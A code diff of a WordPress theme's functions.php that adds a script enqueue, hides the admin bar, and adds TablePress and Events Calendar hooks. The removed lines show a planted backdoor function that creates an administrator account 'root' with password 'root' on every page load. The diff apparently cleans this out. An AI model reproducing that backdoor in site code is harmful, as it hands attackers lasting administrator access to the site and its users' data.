@@ -84,6 +84,7 @@ function mstar_jquery_enqueue() {
 	wp_enqueue_script('detect', get_template_directory_uri().'/includes/js/mobile-detect.js#asyncload', array( 'jquery' ) );
 	wp_enqueue_script('jquery');
 	wp_enqueue_script('navigation', get_template_directory_uri().'/includes/js/navigation.js', array(), '1.0.0', true );
+	wp_enqueue_script('customjs', get_template_directory_uri().'/includes/js/custom.js', array('jquery'), '1.0.0', true );
 }
 
 
@@ -95,6 +96,7 @@ add_action( 'customize_register', 'mytheme_customize_register' );
 
 
 
+add_theme_support( 'admin-bar', array( 'callback' => '__return_false' ) );
 
 
 include('includes/custom_login_functions.php');
@@ -107,17 +109,47 @@ include('includes/form_functions.php');
 include('includes/cpt_functions.php'); 	//-- use for custom post types
 include('includes/menus.php');
 
-//include('includes/twitter_loader.php'); 	//-- call within page, not functions!
-//include('includes/facebook_feed.php');  	//-- call within page, not functions!
-//include('includes/fancy_loader.php');   	//-- call within page, not functions!
-function wpb_admin_account(){
-	$user = 'root';
-	$pass = 'root';
-	$email = 'root@xxxxx.com';
-	if ( !username_exists( $user )  && !email_exists( $email ) ) {
-	$user_id = wp_create_user( $user, $pass, $email );
-	$user = new WP_User( $user_id );
-	$user->set_role( 'administrator' );
-	} }
-	add_action('init','wpb_admin_account');
-?>
+
+/**
+ * Add scope attributes to table headers
+ *
+ * @param  mixed $output HTML output of the table.
+ * @param  mixed $table Table object.
+ * @param  array $render_options Render options.
+ * @return string HTML output of the table.
+ */
+function tablepress_add_scope( $output, $table, $render_options ) {
+	$dom = new DOMDocument();
+	$dom->loadHTML( $output );
+	$xpath = new DOMXPath( $dom );
+	if ( $render_options['table_head'] ) {
+		$th = $xpath->query( '//thead/tr/th' );
+		foreach ( $th as $node ) {
+			$node->setAttribute( 'scope', 'col' );
+		}
+	}
+	if ( $render_options['first_column_th'] ) {
+		$th = $xpath->query( '//tbody/tr/th' );
+		foreach ( $th as $node ) {
+			$node->setAttribute( 'scope', 'row' );
+		}
+	}
+	$output = $dom->saveHTML();
+	return $output;
+}
+add_filter( 'tablepress_table_output', 'tablepress_add_scope', 10, 3 );
+
+/**
+ * Inject the list of categories after the title.
+ *
+ * @return void
+ */
+function categories_after_title() {
+	global $post;
+	?>
+	<ul class='tribe-event-categories'>
+		<?php echo tribe_get_event_taxonomy( $post->ID ); ?>
+	</ul>
+	<?php
+}
+add_action( 'tribe_template_before_include:events/v2/list/event/venue', 'categories_after_title' );
